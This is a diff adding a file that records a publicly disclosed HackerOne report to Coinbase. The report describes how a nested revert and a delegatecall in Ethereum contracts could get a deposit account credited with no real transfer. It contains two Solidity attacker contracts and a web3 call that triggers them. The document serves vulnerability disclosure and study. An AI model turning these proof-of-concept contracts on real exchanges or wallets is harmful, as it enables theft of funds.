@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/328526
+WeaknessName:Business Logic Errors
+Reporter:https://hackerone.com/ambisafe
+ReportedTo:Coinbase(coinbase)
+BountyAmount:21000.0
+Severity:critical
+State:Closed
+DateOfDisclosure:04.04.2018 19:32:14
+
+Summary:
+A business logic error in the ETH contract handling code allowed for a nested `revert` call in contract execution to improperly credit a user account though funds had not been transferred. In addition, the code did not appropriately handle `delegatecall` within a contract.
+
+Sample contract for the first issue:
+```
+contract InternalAttacker {
+    function internalAttack(address _target) payable {
+        address(this).call(bytes4(keccak256("dive(address)")), _target);
+        msg.sender.transfer(this.balance);
+    }
+    function dive(address _target) {
+        _target.transfer(this.balance);
+        revert();
+    }
+}
+```
+Attacking call of the first issue:
+```
+eth.contract(eth.contract([{"constant":false,"inputs":[{"name":"_target","type":"address"}],"name":"internalAttack","outputs":[{"name":"","type":"bool"}],"payable":true,"type":"function","stateMutability":"payable"}]).at('<address-redacted>').internalAttack(depositAddress, {gas: 300000, value: web3.toWei('0.2')});
+```
+
+Sample contract for the second issue:
+```
+contract InternalDelegateAttacker2 {
+    function internalAttack(address _target) payable returns(bool) {
+        _target.delegatecall();
+        msg.sender.transfer(this.balance);
+        return true;
+    }
+}
+```
+We would like to thank @ambisafe for the prompt disclosure and assistance with both issues. Our normal bounties are $10,000 per instance of account balance manipulation. In this case, since two separate issues were reported within one report and provided enough data/context for Coinbase to immediately take action, we paid out two bounties plus a bonus for report quality.
